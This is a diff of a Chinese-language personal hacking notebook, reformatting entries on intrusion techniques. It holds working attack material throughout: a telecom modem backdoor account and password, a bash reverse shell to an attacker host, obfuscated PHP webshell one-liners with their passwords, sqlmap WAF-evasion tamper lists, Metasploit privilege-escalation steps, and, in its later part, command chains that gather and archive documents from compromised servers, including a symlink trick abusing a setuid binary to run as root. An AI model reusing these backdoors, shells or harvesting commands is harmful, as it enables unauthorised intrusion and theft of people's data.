@@ -7,16 +7,34 @@
 <span class="p">3.</span>serve U运行cmd:
     quote site exec "..."
 <span class="p">4.</span>账号telecomadmin密码nE7jA%5m电信猫后门
-<span class="p">5.</span>linux local_root提权  http://exploit.linuxnote.org/
-                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
-                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
-  windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
-<span class="p">6.</span>metasploit与postgresql数据库连接:msf &gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
+<span class="p">5.</span>linux local_root提权  
+	http://exploit.linuxnote.org/
+	https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,
+	linuxprivchecker.py,unix-privesc-check)
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
+	windows local privileges:
+		http://www.52wa.net/post-198.html
+		https://github.com/GDSSecurity/Windows-Exploit-Suggester
+        http://le4f.net/post/post/windows-x64-local-privilege-escalation
+        https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9067#lastpost
+        https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
+        http://www.freebuf.com/articles/web/76892.html
+        https://github.com/foxglovesec/Potato
+        in meterpreter:
+        meterpreter&gt;background
+        msf&gt;use post/multi/recon/local_exploit_suggester 
+        msf&gt;show options
+        msf&gt;exploit
+        or  
+        meterpreter&gt;run post/multi/recon/local_exploit_suggester
+<span class="p">6.</span>metasploit与postgresql数据库连接:
+	msf &gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
 <span class="p">7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
 <span class="p">8.</span>bash反弹:
     /bin/bash -i &gt; /dev/tcp/<span class="nt">&lt;attacker</span><span class="na">_ip</span><span class="nt">&gt;</span>/<span class="nt">&lt;port&gt;</span> 0<span class="err">&lt;&amp;</span>1 2&gt;&amp;1
 <span class="p">9.</span>sed -i '/Love/d' 1.txt   删除包含Love的行
-<span class="p">10.</span>加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&gt;&gt;
+<span class="p">10.</span>加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.
+(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&gt;&gt;
     先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
 <span class="p">11.</span>tar -T mulu.list -czf file.tar.gz
 <span class="p">12.</span>分割大文件再合并
@@ -29,15 +47,18 @@
     修改密码
     SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
     修改权限
-    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;(databasename.tablename可为<span class="ge">*.*</span>,privileges可为all,注意databasename和tablename中不要有'.'这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
+    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;
+	(databasename.tablename可为<span class="ge">*.*</span>,privileges可为all,注意databasename和tablename中不要有'.'这个标点,
+	否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)<span class="sb">
 
-  设置允许本机所有网卡对应ip都可以被root连接命令:
-    grant all privileges on <span class="ge">*.*</span> to root@'%' identified by '12345678' with grant option;
+	设置允许本机所有网卡对应ip都可以被root连接命令:
+    grant all privileges on *.* to root@'%' identified by '12345678' with grant option;
     12345678为root密码
-<span class="p">14.</span>ip:23.23.23.23    (bing)
+</span><span class="p">14.</span>ip:23.23.23.23    (bing)
 <span class="p">15.</span>暴路径http://www.lxway.com/1191778.html  
 <span class="p">16.</span>sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
-  ctrl+D,ctrl+shift+k,ctrl+shift+<span class="nt">&lt;-</span><span class="err">/</span><span class="na">-</span><span class="nt">&gt;</span>,按住shift右键拖动鼠标多行编辑,set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+<span class="p">[</span><span class="nv">/</span><span class="p">]</span>,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
+  ctrl+D,ctrl+shift+k,ctrl+shift+<span class="nt">&lt;-</span><span class="err">/</span><span class="na">-</span><span class="nt">&gt;</span>,按住shift右键拖动鼠标多行编辑,
+  set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+<span class="p">[</span><span class="nv">/</span><span class="p">]</span>,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
 <span class="p">17.</span>nmap :
   nmap -v -sP -PI -PT -Pn 192.168.0.0/24
   nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
@@ -58,12 +79,16 @@
    # netstat -s             # 查看网络统计信息
 
    find . -name "<span class="ge">*vimrc*</span>" | xargs grep -r "linebreak"
-       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/找包含"linebreak"关键字的文件中的与"linebreak"相关的行
+       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查
+	   https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cv
+	   e-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98
+	   %E4%BA%89-cve-2011-0104/找包含"linebreak"关键字的文件中的与"linebreak"相关的行
 <span class="p">19.</span>linux backup and restore:<span class="nt">&lt;sudo&gt;</span>
-    0&gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/    更详细
+    0&gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/ 更详细
     1&gt;backup:
     cd /
-    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys --exclude=/root/.cache /
+    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt 
+	--exclude=/sys --exclude=/root/.cache /
     2&gt;restore:
     backup the new system's /boot and /etc/fstab
     cd /
@@ -89,7 +114,11 @@
   就可以使用如greatest.tamper("and 1&gt;2")等的语句了》)
   各tamper详解:http://www.moonsec.com/post-422.html
   最常用--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
-  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,securesphere,space2comment 21.神器lfi自动探测panoptic:https://github.com/lightos/Panoptic 神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
+  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,
+  nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,
+  securesphere,space2comment 
+<span class="p">21.</span>神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
+	神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
 <span class="p">22.</span>webshell:
   webshell generate site(good):http://www.zjjv.com/
   good:https://r57.gen.tr/
@@ -102,19 +131,12 @@
 <span class="p">23.</span>经典入侵思路:
   http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
 <span class="p">24.</span>cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
-<span class="p">25.</span>vpn搭建教程(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
-                         http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
+<span class="p">25.</span>vpn搭建教程(2003server)
+	http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
+    http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
 <span class="p">26.</span>关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
-<span class="p">27.</span>google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
-   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
-   (little good can search<span class="p">[</span><span class="nv">inurl:index.php?option=</span><span class="p">]</span>,but not(<span class="p">[</span><span class="nv">site:*.edu inurl:inurl.php?option=</span><span class="p">]</span>)) https://pypi.python.org/pypi/Google-Search-API
-   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax-&gt;json-&gt;guan_fang(custom search api,100 results per day for free user)
-   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
-   two links may mean (guan_fang)custom search api
-   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
-   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
-   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
-   具体详情见百度云盘笔记文件夹
+<span class="p">27.</span>google search api for python
+	具体详情见百度云盘笔记文件夹
 <span class="p">28.</span>.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
 <span class="p">29.</span>linux fdisk-&gt;ext3-&gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
 <span class="p">30.</span>Cknife  java环境菜刀  已放到/usr/share
@@ -160,7 +182,9 @@
    @$_=/<span class="ge">*-/*</span>-<span class="ge">*/"a"./*</span>-/<span class="ge">*-*</span>/$_./<span class="ge">*-/*</span>-<span class="err">*</span>/"t";         
    @$_/<span class="ge">*-/*</span>-<span class="ge">*/($/*</span>-/<span class="ge">*-*</span>/{"_P"./<span class="ge">*-/*</span>-<span class="ge">*/"OS"./*</span>-/<span class="ge">*-*</span>/"T"}         
    <span class="p">[</span><span class="nv">/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/</span><span class="p">]</span>);?&gt;  密码是 -7
-   <span class="cp">&lt;?php if(!$_POST['nihao']){header('HTTP/1.1 404 Not Found'); exit(); }else{ $s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; @$s("~[discuz]~e",$_POST['nihao'],"Access denied"); } ?&gt;</span>
+   &lt;?php 
+   if(!$_POST<span class="p">[</span><span class="nv">'nihao'</span><span class="p">]</span>){header('HTTP/1.1 404 Not Found'); exit(); }
+   else{ $s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; @$s("~<span class="p">[</span><span class="nv">discuz</span><span class="p">]</span>~e",$_POST<span class="p">[</span><span class="nv">'nihao'</span><span class="p">]</span>,"Access denied"); } ?&gt;
 
    
    <span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span>
@@ -178,7 +202,8 @@
    &lt;?php
    include 'xxoo.jpg';
    ?&gt;
-   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端"dir 盘符:<span class="se">\"</span>
+   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,
+   其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端"dir 盘符:<span class="se">\"</span>
    看到,对文件也有操作权限,在linux下可看到所有文件,该版本不被查杀
 
    &lt;?php
@@ -206,21 +231,11 @@
    WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y("add6bb58e139be10");      
    <span class="nt">&lt;/script&gt;</span>                              密码是webadmin
 
-   aspx隐藏一句话新:http://z-cg.com/?mod=pad<span class="ni">&amp;act=view&amp;id=10(&lt;%WebServices.ShowRunnerVersion();</span>%&gt;,<span class="err">&lt;</span>%WebServices.InitializeWebServices("fuck");%&gt;)
-<span class="p">31.</span>windows local privileges:http://www.52wa.net/post-198.html
-                            http://le4f.net/post/post/windows-x64-local-privilege-escalation
-                            https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9067#lastpost
-                            https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
-                            http://www.freebuf.com/articles/web/76892.html
-                            https://github.com/foxglovesec/Potato
-                            in meterpreter:
-                            meterpreter&gt;background
-                            msf&gt;use post/multi/recon/local_exploit_suggester 
-                            msf&gt;show options
-                            msf&gt;exploit
-                            or  
-                            meterpreter&gt;run post/multi/recon/local_exploit_suggester
-<span class="p">32.</span>phpstudy for linux:
+   aspx隐藏一句话新:
+   http://z-cg.com/?mod=pad&amp;act=view&amp;id=10
+   (<span class="err">&lt;</span>%WebServices.ShowRunnerVersion();%&gt;,<span class="err">&lt;</span>%WebServices.InitializeWebServices("fuck");%&gt;)
+<span class="p">
+32.</span>phpstudy for linux:
   wget -c http://lamp.phpstudy.net/phpstudy.bin?
   chmod +x phpstudy.bin
   # 权限设置
@@ -275,124 +290,124 @@
   <span class="nt">&lt;/Files&gt;</span>
 <span class="p">39.</span>临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
 <span class="p">40.</span>(command1 &amp; command2)==(command1;command2)    
-   command1 &amp;&amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp; command2)或(command1;command2)中如果command1不成功,command1会执行
-   locate <span class="ge">*.doc &gt; doc.list &amp;&amp; locate *</span>.docx &gt; docx.list &amp;&amp; locate <span class="ge">*.pdf &gt; pdf.list &amp;&amp; locate *</span>.txt &gt; txt.list &amp;&amp; locate <span class="ge">*.xls &gt; xls.list &amp;&amp; locate *</span>.xlsx &gt; xlsx.list &amp;&amp; locate <span class="ge">*.jpg &gt; jpg.list &amp;&amp; locate *</span>.png &gt; png.list
-   tar -czf code.tar.gz <span class="err">*</span> &amp;&amp; tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;&amp; tar -T jpg.list -czf jpg.tar.gz &amp;&amp; tar -T png.list -czf png.tar.gz
+command1 &amp;&amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp; command2)或(command1;command2)中如果command1不成功,command1会执行
+locate <span class="ge">*.doc &gt; doc.list &amp;&amp; locate *</span>.docx &gt; docx.list &amp;&amp; locate <span class="ge">*.pdf &gt; pdf.list &amp;&amp; locate *</span>.txt &gt; txt.list &amp;&amp; locate <span class="ge">*.xls &gt; xls.list &amp;&amp; locate *</span>.xlsx &gt; xlsx.list &amp;&amp; locate <span class="ge">*.jpg &gt; jpg.list &amp;&amp; locate *</span>.png &gt; png.list
+tar -czf code.tar.gz <span class="err">*</span> &amp;&amp; tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;&amp; tar -T jpg.list -czf jpg.tar.gz &amp;&amp; tar -T png.list -czf png.tar.gz
    
    or when there exist the same ip but different site:
 
-   find -regex ".<span class="ge">*\.\(doc\|docx\)" &gt; doc.list &amp;&amp; find -regex ".*</span><span class="se">\.</span>pdf" &gt; pdf.list &amp;&amp; find -regex ".<span class="ge">*\.txt" &gt; txt.list &amp;&amp; find -regex ".*</span><span class="se">\.\(</span>xls<span class="se">\|</span>xlsx<span class="se">\)</span>" &gt; xls.list &amp;&amp; find -regex ".<span class="err">*</span><span class="se">\.\(</span>jpg<span class="se">\|</span>png<span class="se">\)</span>" &gt; jpg.list    
-   ///find . -regex "xxx"   (.)  .  can be used or not while they both mean find the current path
-   ///sometimes the system may not support &amp;&amp; to execute "find",then we should execute above find command without "&amp;&amp;" and find them one by one
-   ///or maybe sometimes the system may not support -regex in find command
-   ///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
-   then the better answer:
-   find . -name "<span class="ge">*.doc" &gt; doc.list &amp;&amp; find . -name "*</span>.docx" &gt; docx.list &amp;&amp; find . -name "<span class="ge">*.pdf" &gt; pdf.list &amp;&amp; find . -name "*</span>.txt" &gt; txt.list &amp;&amp; find . -name "<span class="ge">*.xls" &gt; xls.list &amp;&amp; find . -name "*</span>.xlsx" &gt; xlsx.list &amp;&amp; find . -name "<span class="ge">*.jpg" &gt; jpg.list &amp;&amp; find . -name "*</span>.png" &gt; png.list
-   tar -czf code.tar.gz <span class="err">*</span> &amp;&amp; tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;&amp; tar -T jpg.list -czf jpg.tar.gz &amp;&amp; tar -T png.list -czf png.tar.gz
-   ///however,i found that "&amp;&amp;" or "||" are both not the best,coz command "a &amp;&amp; b" means only command "a" execute successly,then "b" can execute
-   ///comman "a || b" means if "a" execute successly,then "b" will not execute
-   ///but comman "a;b" means "a" and "b" will both execute,no mater the former "a" execute successfully or not 
-   so,the better and beeter combine command is:
-   find . -name "<span class="ge">*.doc" &gt; doc.list;find . -name "*</span>.docx" &gt; docx.list;find . -name "<span class="ge">*.pdf" &gt; pdf.list;find . -name "*</span>.txt" &gt; txt.list;find . -name "<span class="ge">*.xls" &gt; xls.list;find . -name "*</span>.xlsx" &gt; xlsx.list;find . -name "<span class="ge">*.jpg" &gt; jpg.list;find . -name "*</span>.png" &gt; png.list
-   tar -czf code.tar.gz <span class="err">*</span>;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
+find -regex ".<span class="ge">*\.\(doc\|docx\)" &gt; doc.list &amp;&amp; find -regex ".*</span><span class="se">\.</span>pdf" &gt; pdf.list &amp;&amp; find -regex ".<span class="ge">*\.txt" &gt; txt.list &amp;&amp; find -regex ".*</span><span class="se">\.\(</span>xls<span class="se">\|</span>xlsx<span class="se">\)</span>" &gt; xls.list &amp;&amp; find -regex ".<span class="err">*</span><span class="se">\.\(</span>jpg<span class="se">\|</span>png<span class="se">\)</span>" &gt; jpg.list    
+///find . -regex "xxx"   (.)  .  can be used or not while they both mean find the current path
+///sometimes the system may not support &amp;&amp; to execute "find",then we should execute above find command without "&amp;&amp;" and find them one by one
+///or maybe sometimes the system may not support -regex in find command
+///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
+then the better answer:
+find . -name "<span class="ge">*.doc" &gt; doc.list &amp;&amp; find . -name "*</span>.docx" &gt; docx.list &amp;&amp; find . -name "<span class="ge">*.pdf" &gt; pdf.list &amp;&amp; find . -name "*</span>.txt" &gt; txt.list &amp;&amp; find . -name "<span class="ge">*.xls" &gt; xls.list &amp;&amp; find . -name "*</span>.xlsx" &gt; xlsx.list &amp;&amp; find . -name "<span class="ge">*.jpg" &gt; jpg.list &amp;&amp; find . -name "*</span>.png" &gt; png.list
+tar -czf code.tar.gz <span class="err">*</span> &amp;&amp; tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;&amp; tar -T jpg.list -czf jpg.tar.gz &amp;&amp; tar -T png.list -czf png.tar.gz
+///however,i found that "&amp;&amp;" or "||" are both not the best,coz command "a &amp;&amp; b" means only command "a" execute successly,then "b" can execute
+///comman "a || b" means if "a" execute successly,then "b" will not execute
+///but comman "a;b" means "a" and "b" will both execute,no mater the former "a" execute successfully or not 
+so,the better and beeter combine command is:
+find . -name "<span class="ge">*.doc" &gt; doc.list;find . -name "*</span>.docx" &gt; docx.list;find . -name "<span class="ge">*.pdf" &gt; pdf.list;find . -name "*</span>.txt" &gt; txt.list;find . -name "<span class="ge">*.xls" &gt; xls.list;find . -name "*</span>.xlsx" &gt; xlsx.list;find . -name "<span class="ge">*.jpg" &gt; jpg.list;find . -name "*</span>.png" &gt; png.list
+tar -czf code.tar.gz <span class="err">*</span>;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
 
-   recently I found command1;command2 performs not good to search all files in webshell's upon commonds,better to execute comman1 &amp;&amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
+recently I found command1;command2 performs not good to search all files in webshell's upon commonds,better to execute comman1 &amp;&amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
 
-   find . -name "<span class="ge">*.doc" &gt; doc.list &amp;&amp; find . -name "*</span>.docx" &gt; docx.list &amp;&amp; find . -name "<span class="ge">*.pdf" &gt; pdf.list &amp;&amp; find . -name "*</span>.txt" &gt; txt.list &amp;&amp; find . -name "<span class="ge">*.xls" &gt; xls.list &amp;&amp; find . -name "*</span>.xlsx" &gt; xlsx.list
-   tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz
+find . -name "<span class="ge">*.doc" &gt; doc.list &amp;&amp; find . -name "*</span>.docx" &gt; docx.list &amp;&amp; find . -name "<span class="ge">*.pdf" &gt; pdf.list &amp;&amp; find . -name "*</span>.txt" &gt; txt.list &amp;&amp; find . -name "<span class="ge">*.xls" &gt; xls.list &amp;&amp; find . -name "*</span>.xlsx" &gt; xlsx.list
+tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz
 
-   or:
-   mkdir /tmp/tmp
-   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
-   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
+or:
+mkdir /tmp/tmp
+PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
 
-   sometimes when try to execute in this way:
-   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+sometimes when try to execute in this way:
+PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo '''find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list''' &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
 
-   may found it didn't succeed to create list file except for doc.list,then try useing normal webshell's terminal to execute the one without root privilege in one of upon ways<span class="sb">
-
-
-</span>   windows:
-   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:<span class="se">\ </span>%i in (<span class="ge">*.doc,*</span>.docx,<span class="ge">*.pdf,*</span>.xls,<span class="ge">*.xlsx,*</span>.txt) do copy "%i" f:<span class="se">\w</span>eb_r
-   c:<span class="se">\r</span>ecycler<span class="se">\r</span>ar.exe a -k -r -s -m1 c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.rar c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
-   7z.exe a -t7z -p123456 c:<span class="se">\t</span>est.7z c:<span class="se">\t</span>est<span class="se">\*</span>.<span class="err">*</span>
-   del /f/q folder
-   rar a /v20m /m0 newfilename web.rar
-   windows find web.config==&gt;for /r c:<span class="se">\h</span>ttp<span class="se">\ </span>%i in (web.conf?g) do (echo <span class="gs">****</span><span class="ge">*filepath*</span><span class="gs">****</span> &gt;&gt; tmp.txt &amp;&amp; echo %i &gt;&gt; tmp.txt &amp;&amp; type "%i" &gt;&gt; tmp.txt &gt;&gt; tmp.txt &amp;&amp; echo. &gt;&gt; tmp.txt)
-   windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440<span class="sb">
+may found it didn't succeed to create list file except for doc.list,then try useing normal webshell's terminal to execute the one without root privilege in one of upon ways<span class="sb">
 
 
-</span>   windows找文件命令:
